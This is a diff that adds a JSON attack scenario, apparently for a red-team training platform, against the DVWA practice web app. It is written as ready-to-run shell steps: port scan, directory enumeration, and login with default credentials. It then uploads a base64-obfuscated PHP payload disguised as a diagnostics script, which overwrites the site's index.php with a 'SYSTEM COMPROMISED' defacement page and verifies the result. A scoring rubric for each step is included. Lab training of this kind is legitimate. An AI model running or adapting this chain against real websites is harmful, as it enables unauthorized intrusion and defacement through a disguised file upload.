@@ -1,0 +1,203 @@
+{
+  "id": "dvwa_file_tamper",
+  "name": "DVWA File Tampering Attack Chain",
+  "description": "扫描侦察 → 欺骗植入 → 文件篡改：完整演示对 DVWA 靶场的端口扫描、目录枚举、File Upload 漏洞利用以及首页文件替换攻击链。攻击者通过 nmap 发现 Web 服务，gobuster 枚举上传入口，curl 登录获取会话后上传伪装成系统诊断脚本的 PHP 载荷，最终覆盖 DVWA 首页 index.php 实现可视化页面篡改。",
+  "category": "exploitation",
+  "difficulty": "medium",
+  "estimatedDuration": "12 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Reconnaissance",
+    "Initial Access",
+    "Impact"
+  ],
+  "mitreTechniques": [
+    "T1595",
+    "T1046",
+    "T1083",
+    "T1190",
+    "T1608.001",
+    "T1491.001"
+  ],
+  "targetType": [
+    "dvwa",
+    "web_url"
+  ],
+  "steps": [
+    {
+      "id": "step1_nmap_scan",
+      "name": "Port Scan - nmap",
+      "description": "nmap 扫描目标端口和服务版本，发现开放的 Web 服务入口",
+      "toolId": "nmap",
+      "argsTemplate": [
+        "-sV",
+        "-F",
+        "<target>"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1046",
+        "T1595"
+      ],
+      "payload_id": "port-scan"
+    },
+    {
+      "id": "step2_dir_enum",
+      "name": "Directory Enumeration - gobuster",
+      "description": "gobuster 目录枚举，发现 DVWA 文件上传入口 /vulnerabilities/upload/",
+      "toolId": "gobuster",
+      "argsTemplate": [
+        "-u",
+        "<target>",
+        "-w",
+        "config/wordlists/course_web_dirs.txt",
+        "-q"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1083"
+      ],
+      "payload_id": "gobuster"
+    },
+    {
+      "id": "step3_dvwa_init",
+      "name": "DVWA Login & Security Setup",
+      "description": "登录 DVWA 并设置 security=low，获取有效会话供后续上传使用",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo '=== DVWA Init ==='; TOKEN=$(curl -s -c /tmp/dvwa_jar.txt http://<target>/login.php | grep -oP \"user_token' value='\\\\K[^']+\"); if [ -z \"$TOKEN\" ]; then echo 'FATAL: Failed to get CSRF token'; exit 0; fi; curl -s -L -b /tmp/dvwa_jar.txt -c /tmp/dvwa_jar.txt -d \"username=admin&password=password&Login=Login&user_token=$TOKEN\" http://<target>/login.php -o /dev/null; PHPSESSID=$(awk '/PHPSESSID/{print $NF}' /tmp/dvwa_jar.txt); if [ -z \"$PHPSESSID\" ]; then echo 'FATAL: Login failed - no session cookie'; exit 0; fi; CHECK=$(curl -s -L -b /tmp/dvwa_jar.txt http://<target>/index.php | grep -c 'Logout'); echo $PHPSESSID > /tmp/dvwa_session.txt; echo \"DVWA ready (session: $PHPSESSID, login_ok: $CHECK)\""
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1552"
+      ]
+    },
+    {
+      "id": "step4_upload_payload",
+      "name": "Upload Trojan PHP Payload",
+      "description": "生成伪装成系统诊断脚本的 PHP 载荷，通过 File Upload 漏洞上传至靶场",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo 'PD9waHAKJGh0bWwgPSAnPFwhRE9DVFlQRSBodG1sPjxodG1sPjxoZWFkPjxtZXRhIGNoYXJzZXQ9VVRGLTg+PHRpdGxlPlNZU1RFTSBDT01QUk9NSVNFRDwvdGl0bGU+PHN0eWxlPmJvZHl7YmFja2dyb3VuZDojMGEwYTBhO2NvbG9yOiNlMDA7dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzoyNXZoIDA7Zm9udC1mYW1pbHk6QXJpYWx9aDF7Zm9udC1zaXplOjYwcHg7YW5pbWF0aW9uOmIgMnMgaW5maW5pdGV9cHtjb2xvcjojZjkwO2ZvbnQtc2l6ZToyNHB4O21hcmdpbjoyMHB4IDB9aHJ7Ym9yZGVyOjFweCBzb2xpZCAjMzMzO3dpZHRoOjUwJTttYXJnaW46MzBweCBhdXRvfS5pbmZve2NvbG9yOiM0NDQ7Zm9udC1zaXplOjEzcHg7bWFyZ2luLXRvcDo0MHB4fUBrZXlmcmFtZXMgYnswJSwxMDAle29wYWNpdHk6MX01MCV7b3BhY2l0eTouMn19PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPlNZU1RFTSBDT01QUk9NSVNFRDwvaDE+PHA+RFZXQSAtIEZpbGUgVGFtcGVyaW5nIERlbW88L3A+PGhyPjxkaXYgY2xhc3M9aW5mbz5IZXhTdHJpa2UtRWR1IFJlZFRlYW0gUGxhdGZvcm08L2Rpdj48L2JvZHk+PC9odG1sPic7CgokYnl0ZXMgPSBAZmlsZV9wdXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvaW5kZXgucGhwJywgJGh0bWwpOwppZiAoJGJ5dGVzID09PSBmYWxzZSB8fCAkYnl0ZXMgPT09IDApIHsKICAgICRieXRlcyA9IEBmaWxlX3B1dF9jb250ZW50cygnL3Zhci93d3cvaHRtbC9pbmRleC5odG1sJywgJGh0bWwpOwogICAgaWYgKCRieXRlcyAhPT0gZmFsc2UgJiYgJGJ5dGVzID4gMCkgewogICAgICAgIGVjaG8gIkZJTEVfVEFNUEVSRUQ6IGluZGV4Lmh0bWwgY3JlYXRlZCAoJGJ5dGVzIGJ5dGVzKVxuIjsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiRklMRV9UQU1QRVJfRkFJTEVEOiBjYW5ub3Qgd3JpdGUgdG8gL3Zhci93d3cvaHRtbC9cbiI7CiAgICB9Cn0gZWxzZSB7CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdvcGNhY2hlX2ludmFsaWRhdGUnKSkgQG9wY2FjaGVfaW52YWxpZGF0ZSgnL3Zhci93d3cvaHRtbC9pbmRleC5waHAnLCB0cnVlKTsKICAgIGVjaG8gIkZJTEVfVEFNUEVSRUQ6IGluZGV4LnBocCByZXBsYWNlZCAoJGJ5dGVzIGJ5dGVzKVxuIjsKfQo=' | base64 -d > /tmp/diagnostics.php; echo '--- Uploading payload ---'; RESP=$(curl -s -L -b /tmp/dvwa_jar.txt -F \"MAX_FILE_SIZE=100000\" -F \"uploaded=@/tmp/diagnostics.php;type=application/x-php\" -F \"Upload=Upload\" \"http://<target>/vulnerabilities/upload/\"); echo \"$RESP\" | head -c 500; if echo \"$RESP\" | grep -qi \"succesfully\"; then echo 'FILE_UPLOADED: diagnostics.php'; echo 'TRIGGER_URL: http://<target>/hackable/uploads/diagnostics.php'; else echo 'UPLOAD_RESULT: check server response above'; fi"
+      ],
+      "score": 25,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1190",
+        "T1608.001"
+      ]
+    },
+    {
+      "id": "step5_trigger_tamper",
+      "name": "Trigger File Tampering",
+      "description": "访问上传的 PHP 载荷，触发 index.php 覆盖操作，实现首页篡改",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo 'Triggering tamper payload...'; curl -s -L -b /tmp/dvwa_jar.txt \"http://<target>/hackable/uploads/diagnostics.php\""
+      ],
+      "score": 30,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1491.001"
+      ]
+    },
+    {
+      "id": "step6_verify_defaced",
+      "name": "Verify Defaced Homepage",
+      "description": "访问 DVWA 首页，验证页面已被篡改为入侵警告页面",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo '=== Verifying Defacement ==='; curl -s -L http://<target>/ | grep -o 'SYSTEM COMPROMISED' && echo 'VERIFIED: Homepage defaced - SYSTEM COMPROMISED' || echo 'VERIFY_FAILED: Homepage not tampered'"
+      ],
+      "score": 15,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1491.001"
+      ]
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "nmap_open_port",
+        "desc": "nmap 发现开放 HTTP 端口",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "open.*http|80/tcp"
+        }
+      },
+      {
+        "id": "gobuster_upload_found",
+        "desc": "gobuster 枚举到 upload 目录",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "upload"
+        }
+      },
+      {
+        "id": "dvwa_login_ok",
+        "desc": "DVWA 登录成功并设置 security=low",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "DVWA ready"
+        }
+      },
+      {
+        "id": "file_uploaded",
+        "desc": "PHP 载荷上传成功",
+        "points": 25,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "FILE_UPLOADED"
+        }
+      },
+      {
+        "id": "file_tampered",
+        "desc": "index.php 被成功覆盖",
+        "points": 30,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "FILE_TAMPERED"
+        }
+      },
+      {
+        "id": "defaced_verified",
+        "desc": "首页访问确认被篡改为 SYSTEM COMPROMISED",
+        "points": 15,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "VERIFIED.*COMPROMISED|SYSTEM COMPROMISED"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "domain",
+    "ad_domain",
+    "windows_host",
+    "localhost"
+  ],
+  "baselineGroup": "web-vuln-scan",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "文件篡改攻击链需要 DVWA Docker 容器运行且 File Upload 漏洞可用；请确保 security=low 且 hackable/uploads 目录可写",
+  "applicableTargetType": [
+    "dvwa",
+    "web_url"
+  ],
+  "teachingObjective": "演示完整扫描→欺骗→篡改攻击链：nmap/gobuster 侦察发现入口，File Upload 漏洞上传伪装 PHP 载荷（伪装成系统诊断脚本），远程覆盖首页 index.php 实现可视化页面篡改，观众可在浏览器直接看到被篡改页面",
+  "target_class": "dvwa",
+  "disableAutoInsert": true
+}
